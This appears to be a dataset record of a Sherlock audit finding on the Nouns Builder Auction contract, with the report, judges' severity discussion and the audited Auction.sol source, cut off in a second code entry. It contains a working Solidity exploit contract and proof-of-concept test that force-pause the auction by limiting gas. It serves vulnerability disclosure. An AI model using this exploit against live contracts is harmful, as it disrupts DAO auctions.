{
  "Title": "M-1: Attacker can force pause the Auction contract.",
  "Content": "# Issue M-1: Attacker can force pause the Auction contract. \n\nSource: https://github.com/sherlock-audit/2023-09-nounsbuilder-judging/issues/243 \n\n## Found by \n0xMosh, Inspex, SilentDefendersOfDeFi, Tricko, giraffe, kutugu, popeye, unforgiven\n## Summary\nIn certain situations (e.g founders have ownership percentage greater than 51) an attacker can potentially exploit the `try catch`  within the `Auction._CreateAuction()` function to arbitrarily pause the auction contract.\n## Vulnerability Detail\nConsider the code from `Auction._CreateAuction()` function, which is called by `Auction.settleCurrentAndCreateNewAuction()`. It first tries to mint a new token for the auction, and if the minting fails the `catch` branch will be triggered, pausing the auction.\n\n```solidity\nfunction _createAuction() private returns (bool) {\n\t// Get the next token available for bidding\n\ttry token.mint() returns (uint256 tokenId) {\n\t\t// Store the token id\n\t\tauction.tokenId = tokenId;\n\n\t\t// Cache the current timestamp\n\t\tuint256 startTime = block.timestamp;\n\n\t\t// Used to store the auction end time\n\t\tuint256 endTime;\n\n\t\t// Cannot realistically overflow\n\t\tunchecked {\n\t\t\t// Compute the auction end time\n\t\t\tendTime = startTime + settings.duration;\n\t\t}\n\n\t\t// Store the auction start and end time\n\t\tauction.startTime = uint40(startTime);\n\t\tauction.endTime = uint40(endTime);\n\n\t\t// Reset data from the previous auction\n\t\tauction.highestBid = 0;\n\t\tauction.highestBidder = address(0);\n\t\tauction.settled = false;\n\n\t\t// Reset referral from the previous auction\n\t\tcurrentBidReferral = address(0);\n\n\t\temit AuctionCreated(tokenId, startTime, endTime);\n\t\treturn true;\n\t} catch {\n\t\t// Pause the contract if token minting failed\n\t\t_pause();\n\t\treturn false;\n\t}\n}\n```\n\nDue to the internal logic of the mint function, if there are founders with high ownership percentages, many tokens can be minted to them during calls to `mint`as part of the vesting mechanism. As a consequence of this under some circumstances calls to `mint` can consume huge amounts of gas.\n\nCurrently on Ethereum and EVM-compatible chains, calls can consume at most 63/64 of the parent's call gas (See [EIP-150](https://eips.ethereum.org/EIPS/eip-150)). An attacker can exploit this circumstances of high gas cost to restrict the parent gas call limit, making `token.mint()` fail and still leaving enough gas left (1/64) for the `_pause()` call to succeed. Therefore he is able to force the pausing of the auction contract at will.\n\nBased on the gas requirements (1/64 of the gas calls has to be enough for `_pause()` gas cost of 21572), then `token.mint()` will need to consume at least 1359036 gas (63 * 21572), consequently it is only possible on some situations like founders with high percentage of vesting, for example 51 or more.\n\nConsider the following POC. Here we are using another contract to restrict the gas limit of the call, but this can also be done with an EOA call from the attacker.\n\nExploit contract code:\n```solidity\npragma solidity ^0.8.16;\n\ncontract Attacker {\n    function forcePause(address target) external {\n        bytes4 selector = bytes4(keccak256(\"settleCurrentAndCreateNewAuction()\"));\n        assembly {\n            let ptr := mload(0x40)\n            mstore(ptr,selector)\n            let success := call(1500000, target, 0, ptr, 4, 0, 0)\n        }\n    }\n}\n```\n\nPOC:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.16;\n\nimport { NounsBuilderTest } from \"./utils/NounsBuilderTest.sol\";\nimport { MockERC721 } from \"./utils/mocks/MockERC721.sol\";\nimport { MockImpl } from \"./utils/mocks/MockImpl.sol\";\nimport { MockPartialTokenImpl } from \"./utils/mocks/MockPartialTokenImpl.sol\";\nimport { MockProtocolRewards } from \"./utils/mocks/MockProtocolRewards.sol\";\nimport { Auction } from \"../src/auction/Auction.sol\";\nimport { IAuction } from \"../src/auction/IAuction.sol\";\nimport { AuctionTypesV2 } from \"../src/auction/types/AuctionTypesV2.sol\";\nimport { TokenTypesV2 } from \"../src/token/types/TokenTypesV2.sol\";\nimport { Attacker } from \"./Attacker.sol\";\n\ncontract AuctionTest is NounsBuilderTest {\n    MockImpl internal mockImpl;\n    Auction internal rewardImpl;\n    Attacker internal attacker;\n    address internal bidder1;\n    address internal bidder2;\n    address internal referral;\n    uint16 internal builderRewardBPS = 300;\n    uint16 internal referralRewardBPS = 400;\n\n    function setUp() public virtual override {\n        super.setUp();\n        bidder1 = vm.addr(0xB1);\n        bidder2 = vm.addr(0xB2);\n        vm.deal(bidder1, 100 ether);\n        vm.deal(bidder2, 100 ether);\n        mockImpl = new MockImpl();\n        rewardImpl = new Auction(address(manager), address(rewards), weth, builderRewardBPS, referralRewardBPS);\n        attacker = new Attacker();\n    }\n\n    function test_POC() public {\n        // START OF SETUP\n        address[] memory wallets = new address[](1);\n        uint256[] memory percents = new uint256[](1);\n        uint256[] memory vestingEnds = new uint256[](1);\n        wallets[0] = founder;\n        percents[0] = 99;\n        vestingEnds[0] = 4 weeks;\n        //Setting founder with high percentage ownership.\n        setFounderParams(wallets, percents, vestingEnds);\n        setMockTokenParams();\n        setMockAuctionParams();\n        setMockGovParams();\n        deploy(foundersArr, tokenParams, auctionParams, govParams);\n        setMockMetadata();\n        // END OF SETUP\n\n        // Start auction contract and do the first auction\n        vm.prank(founder);\n        auction.unpause();\n        vm.prank(bidder1);\n        auction.createBid{ value: 0.420 ether }(99);\n        vm.prank(bidder2);\n        auction.createBid{ value: 1 ether }(99);\n\n        // Move block.timestamp so auction can end.\n        vm.warp(10 minutes + 1 seconds);\n\n        //Attacker calls the auction\n        attacker.forcePause(address(auction));\n\n        //Check that auction was paused.\n        assertEq(auction.paused(), true);\n    }\n}\n```\n\n## Impact\nShould the conditions mentioned above be met, an attacker can arbitrarily pause the auction contract, effectively interrupting the DAO auction process. This pause persists until owners takes subsequent actions to unpause the contract. The attacker can exploit this vulnerability repeatedly.\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/auction/Auction.sol#L238-L241\n\nhttps://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/auction/Auction.sol#L292-L329\n\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider better handling the possible errors from `Token.mint()`, like shown below:\n\n```solidity\n  function _createAuction() private returns (bool) {\n      // Get the next token available for bidding\n      try token.mint() returns (uint256 tokenId) {\n          //CODE OMMITED\n      } catch (bytes memory err) {\n          // On production consider pre-calculating the hash values to save gas\n          if (keccak256(abi.encodeWithSignature(\"NO_METADATA_GENERATED()\")) == keccak256(err)) {\n              _pause();\n              return false\n          } else if (keccak256(abi.encodeWithSignature(\"ALREADY_MINTED()\") == keccak256(err)) {\n              _pause();\n              return false\n          } else {\n              revert OUT_OF_GAS();\n          }\n      } \n```\n\n\n\n## Discussion\n\n**nevillehuang**\n\nThis is a previously known issue already proven to be not possible and incorrectly awarded in the previous audit as seen in the comments [here](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719).\n\nAdditionally, even if this is possible, DAO can unpause the auction FOC, meaning the attacker would be effectively losing funds from gas to maliciously pause the contract.\n\n**nevillehuang**\n\nHi @neokry @Czar102 can you double check this issue just in case. There is some code changes that i missed out from the previous C4 audit that seems to indicate this issue is possible from the PoC. But I believe this to be still invalid/lowseverity given auction can be unpaused free of charged by the DAO and no further loss of funds since users cannot bid anyways given auction did not start so the DoS is not permanent, and the malicious user would effectively be wasting gas funds to pause the auction. \n\n**Arabadzhiew**\n\nEscalate\n\nThis actually seems to be a valid finding. [This comment](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719#issuecomment-1303844210) from the above linked issue from the previous C4 contest seems to explain the current situation quite well. \nThe catch block was initially looking like this `catch Error(string memory) {`, while now it looks like this `catch {`. This means that initially, the catch block was only catching string errors, while now it will catch anything, including OOG reverts.\n\nAdditionally, since each unpause action will have to go through a separate governance proposal (which usually take a couple of days), this means that the auction participants will most likely lose interest in participating in the auctions of that particular DAO (especially if the auction gets paused multiple times), in turn - leading to a loss of funds for the DAO being exploited with this vulnerability.\n\nBecause of that, I believe that this issue warrants a ***Medium*** severity.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This actually seems to be a valid finding. [This comment](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719#issuecomment-1303844210) from the above linked issue from the previous C4 contest seems to explain the current situation quite well. \n> The catch block was initially looking like this `catch Error(string memory) {`, while now it looks like this `catch {`. This means that initially, the catch block was only catching string errors, while now it will catch anything, including OOG reverts.\n> \n> Additionally, since each unpause action will have to go through a separate governance proposal (which usually take a couple of days), this means that the auction participants will most likely lose interest in participating in the auctions of that particular DAO (especially if the auction gets paused multiple times), in turn - leading to a loss of funds for the DAO being exploited with this vulnerability.\n> \n> Because of that, I believe that this issue warrants a ***Medium*** severity.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Oot2k**\n\nI completely agree with @Arabadzhiew escalation.\n\nThe C4 issue was actually invalid in the old codebase, but in the new current codebase its valid / a valid concern.  \nPlease see #125 for a foundry POC which demonstrates the issue.\n\nThe impact of this is IMO medium, because it requires a specific set of admin params, which are less likely to accrue in real world.\nI still want to emphasis that this is exactly what the medium category is meant for. \n\nFor this reason I believe this issue and its duplicates are valid medium findings.\n\nBest regards!    \n\n**nevillehuang**\n\n1. No funds loss\n2. DoS not permanent\n\nFor this reasons this should at most be low severity.\n\n**neokry**\n\nagree with @nevillehuang here. user also has to spend a relativly high amount of gas to execute this attack each time and realistically most DAOs have < 50% founder allocation\n\n**Arabadzhiew**\n\nOk, first about the DOS part. \nTheoretically speaking, since in the `Governor` contract we have both the [`MAX_VOTING_DELAY`](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/governance/governor/Governor.sol#L48) and [`MAX_VOTING_PERIOD`](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/governance/governor/Governor.sol#L54) constants set to `24 weeks`, this means that if the `votingDelay` and `votingPeriod` values are set to those respective max values, a given auction can be paused for up to **336 days** at a time. Combining this with the fact that this exploit can be repeated more than once, and we see that this actually qualifies as a DOS issue, as per the Sherlock docs. Obviously, a lot of things have to line up perfectly in order for this to happen, but the point is that it can **theoretically** happen.\n\nFor the loss of funds part.\nI am just going to ask you all a question on this one. If you were going to participate in a NFT auction, but for some reason, this auction gets paused a number of times, for a couple of days each time, won't you just get fed up with that at some point and decide to go and invest your **assets** and time somewhere else?\n\n**nevillehuang**\n\n@Arabadzhiew Too many conditions need to be lined up for this to occur\n\n1. Realistically speaking, no governance will set a voting period and voting delay of 24 weeks (5.5 months)\n2. Even if theoretically possible, the attacker will need to perform this over and over again, each time wasting large amount of gas funds to block the auction, with no additional incentives to him\n3. Since the auction has not started, no bidders can bid, so no-one will be losing funds here. No NFT will be minted to anyone, including the malicious attacker pausing.\n4. The DAO can unpause at anytime by paying gas, so the cost of attack by the attacker is significantly larger than the DAO unpausing. So again, no incentives for him to perform this attack.\n5. Sure users can get fed-up and governance may lose potential bidders, but I don't think that is a good enough reason to validate this issue as seen by this comment by @Czar102 [here](https://github.com/sherlock-audit/2023-10-notional-judging/issues/70#issuecomment-1845035728), where potential loss of profits from missing bidders is not a valid reason to validate the issue.\n\n**Arabadzhiew**\n\nI agree that both the impact from the DOS and the loss of fund issue are relatively questionable on their own, but given the fact that both of them are present with the vulnerability in question, it makes me consider it as one of a medium severity.\n\nThat's my take on the matter.\n\n**Czar102**\n\nWhat is the minimum percentage of the tokens founders need to have for this to be an issue? @Arabadzhiew \nFrom my understanding, prevention would be quite easy by simply minting the tokens as they are vested, but this wouldn't work if we already had an issue of an attacker submitting these low-gas transactions (if they were frontrunning). Also, can anyone be the attacker here, or only the founders?\n\nFrom my understanding, it can classify as medium as stopping the auction impacts protocol's core protocol functionality. But the number of assumptions here may be quite large, so I am not sure if the assumptions are reasonable.\n\n**Arabadzhiew**\n\n> What is the minimum percentage of the tokens founders need to have for this to be an issue? @Arabadzhiew From my understanding, prevention would be quite easy by simply minting the tokens as they are vested, but this wouldn't work if we already had an issue of an attacker submitting these low-gas transactions (if they were frontrunning). Also, can anyone be the attacker here, or only the founders?\n> \n> From my understanding, it can classify as medium as stopping the auction impacts protocol's core protocol functionality. But the number of assumptions here may be quite large, so I am not sure if the assumptions are reasonable.\n\nIn this report it is stated that the minimum percentage is 51, but I can't confirm on that number. Also, yes, anyone can be an attacker here, since the `settleCurrentAndCreateNewAuction` function, which is the one being used for this exploit, does not have any access control.\n\n**Oot2k**\n\nI am not sure but in the old report the amount needed was ~26. And yes technically the DOS can last a year / every time the dao its unpaused it can be dosed again. Most of the time proposal period is set to > 2 weeks so it would cut the earnings of a DAO significantly.\n\nBut yes the amount of founders tokens is quite unlikely, maybe if there is only a short auction time -> so high supply of tokens this could happen realistically. \n\n**Czar102**\n\nI believe this is a valid Medium severity issue on the grounds of impacting core protocol functionality (not DoS or loss of funds). Planning to accept the escalation.\n\nAs a side note, as @nevillehuang mentioned, opportunity loss of the DAO is not a loss of funds.\n\n**Czar102**\n\nResult:\nMedium\nHas duplicates\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Arabadzhiew](https://github.com/sherlock-audit/2023-09-nounsbuilder-judging/issues/243/#issuecomment-1855404269): accepted\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/111",
  "Code": [
    {
      "filename": "nouns-protocol/src/auction/Auction.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.16;\n\nimport { UUPS } from \"../lib/proxy/UUPS.sol\";\nimport { Ownable } from \"../lib/utils/Ownable.sol\";\nimport { ReentrancyGuard } from \"../lib/utils/ReentrancyGuard.sol\";\nimport { Pausable } from \"../lib/utils/Pausable.sol\";\nimport { SafeCast } from \"../lib/utils/SafeCast.sol\";\n\nimport { AuctionStorageV1 } from \"./storage/AuctionStorageV1.sol\";\nimport { Token } from \"../token/Token.sol\";\nimport { AuctionStorageV2 } from \"./storage/AuctionStorageV2.sol\";\nimport { Manager } from \"../manager/Manager.sol\";\nimport { IAuction } from \"./IAuction.sol\";\nimport { IWETH } from \"../lib/interfaces/IWETH.sol\";\nimport { IProtocolRewards } from \"../lib/interfaces/IProtocolRewards.sol\";\n\nimport { VersionedContract } from \"../VersionedContract.sol\";\n\n/// @title Auction\n/// @author Rohan Kulkarni & Neokry\n/// @notice A DAO's auction house\n/// @custom:repo github.com/ourzora/nouns-protocol\n/// Modified from:\n/// - NounsAuctionHouse.sol commit 2cbe6c7 - licensed under the BSD-3-Clause license.\n/// - Zora V3 ReserveAuctionCoreEth module commit 795aeca - licensed under the GPL-3.0 license.\ncontract Auction is IAuction, VersionedContract, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionStorageV1, AuctionStorageV2 {\n    ///                                                          ///\n    ///                          CONSTANTS                       ///\n    ///                                                          ///\n\n    /// @notice The basis points for 100%\n    uint256 private constant BPS_PER_100_PERCENT = 10_000;\n\n    /// @notice The maximum rewards percentage\n    uint256 private constant MAX_FOUNDER_REWARD_BPS = 3_000;\n\n    ///                                                          ///\n    ///                          IMMUTABLES                      ///\n    ///                                                          ///\n\n    /// @notice Iniital time buffer for auction bids\n    uint40 private immutable INITIAL_TIME_BUFFER = 5 minutes;\n\n    /// @notice Min bid increment BPS\n    uint8 private immutable INITIAL_MIN_BID_INCREMENT_PERCENT = 10;\n\n    /// @notice The address of WETH\n    address private immutable WETH;\n\n    /// @notice The contract upgrade manager\n    Manager private immutable manager;\n\n    /// @notice The rewards manager\n    IProtocolRewards private immutable rewardsManager;\n\n    /// @notice The builder reward BPS as a percent of settled auction amount\n    uint16 public immutable builderRewardsBPS;\n\n    /// @notice The referral reward BPS as a percent of settled auction amount\n    uint16 public immutable referralRewardsBPS;\n\n    ///                                                          ///\n    ///                          CONSTRUCTOR                     ///\n    ///                                                          ///\n\n    /// @param _manager The contract upgrade manager address\n    /// @param _rewardsManager The protocol rewards manager address\n    /// @param _weth The address of WETH\n    constructor(\n        address _manager,\n        address _rewardsManager,\n        address _weth,\n        uint16 _builderRewardsBPS,\n        uint16 _referralRewardsBPS\n    ) payable initializer {\n        manager = Manager(_manager);\n        rewardsManager = IProtocolRewards(_rewardsManager);\n        WETH = _weth;\n        builderRewardsBPS = _builderRewardsBPS;\n        referralRewardsBPS = _referralRewardsBPS;\n    }\n\n    ///                                                          ///\n    ///                          INITIALIZER                     ///\n    ///                                                          ///\n\n    /// @notice Initializes a DAO's auction contract\n    /// @param _token The ERC-721 token address\n    /// @param _founder The founder responsible for starting the first auction\n    /// @param _treasury The treasury address where ETH will be sent\n    /// @param _duration The duration of each auction\n    /// @param _reservePrice The reserve price of each auction\n    /// @param _founderRewardRecipient The address to recieve founders rewards\n    /// @param _founderRewardBps The percent of rewards a founder receives in BPS for each auction\n    function initialize(\n        address _token,\n        address _founder,\n        address _treasury,\n        uint256 _duration,\n        uint256 _reservePrice,\n        address _founderRewardRecipient,\n        uint16 _founderRewardBps\n    ) external initializer {\n        // Ensure the caller is the contract manager\n        if (msg.sender != address(manager)) revert ONLY_MANAGER();\n\n        // Ensure the founder reward is not more than max\n        if (_founderRewardBps > MAX_FOUNDER_REWARD_BPS) revert INVALID_REWARDS_BPS();\n\n        // Ensure the recipient is set if the reward is greater than 0\n        if (_founderRewardBps > 0 && _founderRewardRecipient == address(0)) revert INVALID_REWARDS_RECIPIENT();\n\n        // Initialize the reentrancy guard\n        __ReentrancyGuard_init();\n\n        // Grant initial ownership to a founder\n        __Ownable_init(_founder);\n\n        // Pause the contract until the first auction\n        __Pausable_init(true);\n\n        // Store DAO's ERC-721 token\n        token = Token(_token);\n\n        // Store the auction house settings\n        settings.duration = SafeCast.toUint40(_duration);\n        settings.reservePrice = _reservePrice;\n        settings.treasury = _treasury;\n        settings.timeBuffer = INITIAL_TIME_BUFFER;\n        settings.minBidIncrement = INITIAL_MIN_BID_INCREMENT_PERCENT;\n\n        // Store the founder rewards settings\n        founderReward.recipient = _founderRewardRecipient;\n        founderReward.percentBps = _founderRewardBps;\n    }\n\n    ///                                                          ///\n    ///                          CREATE BID                      ///\n    ///                                                          ///\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function createBidWithReferral(uint256 _tokenId, address _referral) external payable nonReentrant {\n        currentBidReferral = _referral;\n        _createBid(_tokenId);\n    }\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function createBid(uint256 _tokenId) external payable nonReentrant {\n        currentBidReferral = address(0);\n        _createBid(_tokenId);\n    }\n\n    /// @notice Creates a bid for the current token\n    /// @param _tokenId The ERC-721 token id\n    function _createBid(uint256 _tokenId) private {\n        // Ensure the bid is for the current token\n        if (auction.tokenId != _tokenId) {\n            revert INVALID_TOKEN_ID();\n        }\n\n        // Ensure the auction is still active\n        if (block.timestamp >= auction.endTime) {\n            revert AUCTION_OVER();\n        }\n\n        // Cache the amount of ETH attached\n        uint256 msgValue = msg.value;\n\n        // Cache the address of the highest bidder\n        address lastHighestBidder = auction.highestBidder;\n\n        // Cache the last highest bid\n        uint256 lastHighestBid = auction.highestBid;\n\n        // Store the new highest bid\n        auction.highestBid = msgValue;\n\n        // Store the new highest bidder\n        auction.highestBidder = msg.sender;\n\n        // Used to store whether to extend the auction\n        bool extend;\n\n        // Cannot underflow as `_auction.endTime` is ensured to be greater than the current time above\n        unchecked {\n            // Compute whether the time remaining is less than the buffer\n            extend = (auction.endTime - block.timestamp) < settings.timeBuffer;\n\n            // If the auction should be extended\n            if (extend) {\n                // Update the end time with the additional time buffer\n                auction.endTime = uint40(block.timestamp + settings.timeBuffer);\n            }\n        }\n\n        // If this is the first bid:\n        if (lastHighestBidder == address(0)) {\n            // Ensure the bid meets the reserve price\n            if (msgValue < settings.reservePrice) {\n                revert RESERVE_PRICE_NOT_MET();\n            }\n\n            // Else this is a subsequent bid:\n        } else {\n            // Used to store the minimum bid required\n            uint256 minBid;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the minimum bid\n                minBid = lastHighestBid + ((lastHighestBid * settings.minBidIncrement) / 100);\n            }\n\n            // Ensure the incoming bid meets the minimum\n            if (msgValue < minBid) {\n                revert MINIMUM_BID_NOT_MET();\n            }\n            // Ensure that the second bid is not also zero\n            if (minBid == 0 && msgValue == 0 && lastHighestBidder != address(0)) {\n                revert MINIMUM_BID_NOT_MET();\n            }\n\n            // Refund the previous bidder\n            _handleOutgoingTransfer(lastHighestBidder, lastHighestBid);\n        }\n\n        emit AuctionBid(_tokenId, msg.sender, msgValue, extend, auction.endTime);\n    }\n\n    ///                                                          ///\n    ///                    SETTLE & CREATE AUCTION               ///\n    ///                                                          ///\n\n    /// @notice Settles the current auction and creates the next one\n    function settleCurrentAndCreateNewAuction() external nonReentrant whenNotPaused {\n        _settleAuction();\n        _createAuction();\n    }\n\n    /// @dev Settles the current auction\n    function _settleAuction() private {\n        // Get a copy of the current auction\n        Auction memory _auction = auction;\n\n        // Ensure the auction wasn't already settled\n        if (auction.settled) revert AUCTION_SETTLED();\n\n        // Ensure the auction had started\n        if (_auction.startTime == 0) revert AUCTION_NOT_STARTED();\n\n        // Ensure the auction is over\n        if (block.timestamp < _auction.endTime) revert AUCTION_ACTIVE();\n\n        // Mark the auction as settled\n        auction.settled = true;\n\n        // If a bid was placed:\n        if (_auction.highestBidder != address(0)) {\n            // Cache the amount of the highest bid\n            uint256 highestBid = _auction.highestBid;\n\n            // If the highest bid included ETH: Pay rewards and transfer remaining amount to the DAO treasury\n            if (highestBid != 0) {\n                // Calculate rewards\n                RewardSplits memory split = _computeTotalRewards(currentBidReferral, highestBid, founderReward.percentBps);\n\n                if (split.totalRewards != 0) {\n                    // Deposit rewards\n                    rewardsManager.depositBatch{ value: split.totalRewards }(split.recipients, split.amounts, split.reasons, \"\");\n                }\n\n                // Deposit remaining amount to treasury\n                _handleOutgoingTransfer(settings.treasury, highestBid - split.totalRewards);\n            }\n\n            // Transfer the token to the highest bidder\n            token.transferFrom(address(this), _auction.highestBidder, _auction.tokenId);\n\n            // Else no bid was placed:\n        } else {\n            // Burn the token\n            token.burn(_auction.tokenId);\n        }\n\n        emit AuctionSettled(_auction.tokenId, _auction.highestBidder, _auction.highestBid);\n    }\n\n    /// @dev Creates an auction for the next token\n    function _createAuction() private returns (bool) {\n        // Get the next token available for bidding\n        try token.mint() returns (uint256 tokenId) {\n            // Store the token id\n            auction.tokenId = tokenId;\n\n            // Cache the current timestamp\n            uint256 startTime = block.timestamp;\n\n            // Used to store the auction end time\n            uint256 endTime;\n\n            // Cannot realistically overflow\n            unchecked {\n                // Compute the auction end time\n                endTime = startTime + settings.duration;\n            }\n\n            // Store the auction start and end time\n            auction.startTime = uint40(startTime);\n            auction.endTime = uint40(endTime);\n\n            // Reset data from the previous auction\n            auction.highestBid = 0;\n            auction.highestBidder = address(0);\n            auction.settled = false;\n\n            // Reset referral from the previous auction\n            currentBidReferral = address(0);\n\n            emit AuctionCreated(tokenId, startTime, endTime);\n            return true;\n        } catch {\n            // Pause the contract if token minting failed\n            _pause();\n            return false;\n        }\n    }\n\n    ///                                                          ///\n    ///                             PAUSE                        ///\n    ///                                                          ///\n\n    /// @notice Unpauses the auction house\n    function unpause() external onlyOwner {\n        _unpause();\n\n        // If this is the first auction:\n        if (!settings.launched) {\n            // Mark the DAO as launched\n            settings.launched = true;\n\n            // Transfer ownership of the auction contract to the DAO\n            transferOwnership(settings.treasury);\n\n            // Transfer ownership of the token contract to the DAO\n            token.onFirstAuctionStarted();\n\n            // Start the first auction\n            if (!_createAuction()) {\n                // In cause of failure, revert.\n                revert AUCTION_CREATE_FAILED_TO_LAUNCH();\n            }\n        }\n        // Else if the contract was paused and the previous auction was settled:\n        else if (auction.settled) {\n            // Start the next auction\n            _createAuction();\n        }\n    }\n\n    /// @notice Pauses the auction house\n    function pause() external onlyOwner {\n        _pause();\n    }\n\n    /// @notice Settles the latest auction when the contract is paused\n    function settleAuction() external nonReentrant whenPaused {\n        _settleAuction();\n    }\n\n    ///                                                          ///\n    ///                       AUCTION SETTINGS                   ///\n    ///                                                          ///\n\n    /// @notice The DAO treasury\n    function treasury() external view returns (address) {\n        return settings.treasury;\n    }\n\n    /// @notice The time duration of each auction\n    function duration() external view returns (uint256) {\n        return settings.duration;\n    }\n\n    /// @notice The reserve price of each auction\n    function reservePrice() external view returns (uint256) {\n        return settings.reservePrice;\n    }\n\n    /// @notice The minimum amount of time to place a bid during an active auction\n    function timeBuffer() external view returns (uint256) {\n        return settings.timeBuffer;\n    }\n\n    /// @notice The minimum percentage an incoming bid must raise the highest bid\n    function minBidIncrement() external view returns (uint256) {\n        return settings.minBidIncrement;\n    }\n\n    ///                                                          ///\n    ///                       UPDATE SETTINGS                    ///\n    ///                                                          ///\n\n    /// @notice Updates the time duration of each auction\n    /// @param _duration The new time duration\n    function setDuration(uint256 _duration) external onlyOwner whenPaused {\n        settings.duration = SafeCast.toUint40(_duration);\n\n        emit DurationUpdated(_duration);\n    }\n\n    /// @notice Updates the reserve price of each auction\n    /// @param _reservePrice The new reserve price\n    function setReservePrice(uint256 _reservePrice) external onlyOwner whenPaused {\n        settings.reservePrice = _reservePrice;\n\n        emit ReservePriceUpdated(_reservePrice);\n    }\n\n    /// @notice Updates the time buffer of each auction\n    /// @param _timeBuffer The new time buffer\n    function setTimeBuffer(uint256 _timeBuffer) external onlyOwner whenPaused {\n        settings.timeBuffer = SafeCast.toUint40(_timeBuffer);\n\n        emit TimeBufferUpdated(_timeBuffer);\n    }\n\n    /// @notice Updates the minimum bid increment of each subsequent bid\n    /// @param _percentage The new percentage\n    function setMinimumBidIncrement(uint256 _percentage) external onlyOwner whenPaused {\n        if (_percentage == 0) {\n            revert MIN_BID_INCREMENT_1_PERCENT();\n        }\n\n        settings.minBidIncrement = SafeCast.toUint8(_percentage);\n\n        emit MinBidIncrementPercentageUpdated(_percentage);\n    }\n\n    /// @notice Updates the founder reward recipent address\n    /// @param reward The new founder reward settings\n    function setFounderReward(FounderReward calldata reward) external onlyOwner whenPaused {\n        // Ensure the founder reward is not more than max\n        if (reward.percentBps > MAX_FOUNDER_REWARD_BPS) revert INVALID_REWARDS_BPS();\n\n        // Ensure the recipient is set if the reward is greater than 0\n        if (reward.percentBps > 0 && reward.recipient == address(0)) revert INVALID_REWARDS_RECIPIENT();\n\n        // Update the founder reward settings\n        founderReward = reward;\n\n        emit FounderRewardUpdated(reward);\n    }\n\n    ///                                                          ///\n    ///                       COMPUTE REWARDS UTIL               ///\n    ///                                                          ///\n\n    /// @notice Computes the total rewards for a bid\n    /// @param _currentBidRefferal The referral for the current bid\n    /// @param _finalBidAmount The final bid amount\n    /// @param _founderRewardBps The reward to be paid to the founder in BPS\n    function _computeTotalRewards(\n        address _currentBidRefferal,\n        uint256 _finalBidAmount,\n        uint256 _founderRewardBps\n    ) internal view returns (RewardSplits memory split) {\n        // Get global builder recipient from manager\n        address builderRecipient = manager.builderRewardsRecipient();\n\n        // Calculate the total rewards percentage\n        uint256 totalBPS = _founderRewardBps + referralRewardsBPS + builderRewardsBPS;\n\n        // Verify percentage is not more than 100\n        if (totalBPS >= BPS_PER_100_PERCENT) {\n            revert INVALID_REWARD_TOTAL();\n        }\n\n        // Calulate total rewards\n        split.totalRewards = (_finalBidAmount * totalBPS) / BPS_PER_100_PERCENT;\n\n        // Check if founder reward is enabled\n        bool hasFounderReward = _founderRewardBps > 0 && founderReward.recipient != address(0);\n\n        // Set array size based on if founder reward is enabled\n        uint256 arraySize = hasFounderReward ? 3 : 2;\n\n        // Initialize arrays\n        split.recipients = new address[](arraySize);\n        split.amounts = new uint256[](arraySize);\n        split.reasons = new bytes4[](arraySize);\n\n        // Set builder reward\n        split.recipients[0] = builderRecipient;\n        split.amounts[0] = (_finalBidAmount * builderRewardsBPS) / BPS_PER_100_PERCENT;\n\n        // Set referral reward\n        split.recipients[1] = _currentBidRefferal != address(0) ? _currentBidRefferal : builderRecipient;\n        split.amounts[1] = (_finalBidAmount * referralRewardsBPS) / BPS_PER_100_PERCENT;\n\n        // Set founder reward if enabled\n        if (hasFounderReward) {\n            split.recipients[2] = founderReward.recipient;\n            split.amounts[2] = (_finalBidAmount * _founderRewardBps) / BPS_PER_100_PERCENT;\n        }\n    }\n\n    ///                                                          ///\n    ///                        TRANSFER UTIL                     ///\n    ///                                                          ///\n\n    /// @notice Transfer ETH/WETH from the contract\n    /// @param _to The recipient address\n    /// @param _amount The amount transferring\n    function _handleOutgoingTransfer(address _to, uint256 _amount) private {\n        // Ensure the contract has enough ETH to transfer\n        if (address(this).balance < _amount) revert INSOLVENT();\n\n        // Used to store if the transfer succeeded\n        bool success;\n\n        assembly {\n            // Transfer ETH to the recipient\n            // Limit the call to 50,000 gas\n            success := call(50000, _to, _amount, 0, 0, 0, 0)\n        }\n\n        // If the transfer failed:\n        if (!success) {\n            // Wrap as WETH\n            IWETH(WETH).deposit{ value: _amount }();\n\n            // Transfer WETH instead\n            bool wethSuccess = IWETH(WETH).transfer(_to, _amount);\n\n            // Ensure successful transfer\n            if (!wethSuccess) {\n                revert FAILING_WETH_TRANSFER();\n            }\n        }\n    }\n\n    ///                                                          ///\n    ///                        AUCTION UPGRADE                   ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner whenPaused {\n        // Ensure the new implementation is registered by the Builder DAO\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}"
    },
    {
      "filename": "nouns-protocol/src/auction/Auction.sol",
